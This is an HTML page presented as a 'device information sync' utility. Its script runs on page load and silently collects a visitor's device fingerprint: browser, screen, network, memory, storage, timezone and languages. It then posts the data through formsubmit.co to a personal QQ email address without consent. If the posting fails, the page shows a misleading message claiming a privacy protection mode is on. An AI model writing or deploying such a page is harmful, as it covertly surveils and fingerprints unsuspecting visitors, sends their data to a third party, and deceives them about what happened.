<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>设备信息同步</title>
    <style>
        #status { 
            padding: 20px;
            margin: 20px;
            border-radius: 5px;
            display: none;
        }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
    </style>
</head>
<body>
    <div id="status"></div>

    <script>
        (function() {
            'use strict';
            const statusEl = document.getElementById('status');
            
            // 增强版信息采集
            async function collectDeviceInfo() {
                const info = {};
                
                // 基础信息
                try { info.userAgent = navigator.userAgent; } catch {}
                try { info.platform = navigator.platform; } catch {}
                try { info.vendor = navigator.vendor; } catch {}
                try { info.cookieEnabled = navigator.cookieEnabled; } catch {}
                
                // 增强显示信息
                try {
                    info.display = {
                        width: screen.width,
                        height: screen.height,
                        availWidth: screen.availWidth,
                        availHeight: screen.availHeight,
                        colorDepth: screen.colorDepth,
                        orientation: screen.orientation?.type,
                        pixelRatio: window.devicePixelRatio
                    };
                } catch {}
                
                // 增强设备能力
                try {
                    info.capabilities = {
                        touch: 'ontouchstart' in window,
                        vibration: 'vibrate' in navigator,
                        geolocation: 'geolocation' in navigator,
                        serviceWorker: 'serviceWorker' in navigator
                    };
                } catch {}
                
                // 网络信息增强
                try {
                    const connection = navigator.connection || navigator.mozConnection;
                    if (connection) {
                        info.connection = {
                            type: connection.type,
                            effectiveType: connection.effectiveType,
                            downlink: connection.downlink,
                            rtt: connection.rtt,
                            saveData: connection.saveData
                        };
                    }
                } catch {}
                
                // 存储信息
                try {
                    info.storage = {
                        deviceMemory: navigator.deviceMemory,
                        hardwareConcurrency: navigator.hardwareConcurrency,
                        storageEstimate: await navigator.storage.estimate(),
                        persisted: await navigator.storage.persisted()
                    };
                } catch {}
                
                // 时区语言
                try {
                    info.locale = {
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        languages: navigator.languages,
                        language: navigator.language
                    };
                } catch {}
                
                return info;
            }

            // 自动提交逻辑
            async function autoSubmit() {
                try {
                    statusEl.textContent = '正在收集设备信息...';
                    statusEl.style.display = 'block';

                    const formData = new FormData();
                    const deviceInfo = await collectDeviceInfo();
                    
                    // 构建表单数据
                    formData.append('_to', '3674295723@qq.com');
                    formData.append('_subject', '自动设备报告');
                    formData.append('device_data', JSON.stringify(deviceInfo, null, 2));
                    
                    // 静默提交
                    const response = await fetch('https://formsubmit.co/3674295723@qq.com', {
                        method: 'POST',
                        body: formData,
                        mode: 'no-cors'
                    });

                    statusEl.className = 'success';
                    statusEl.innerHTML = '✅ 信息已自动同步完成';
                } catch (error) {
                    statusEl.className = 'error';
                    statusEl.innerHTML = '⚠️ 信息同步失败（已启用隐私保护模式）';
                }
            }

            // 页面加载后自动执行
            window.addEventListener('load', () => {
                setTimeout(autoSubmit, 1500); // 延迟1.5秒确保完全加载
            });
        })();
    </script>
</body>
</html>
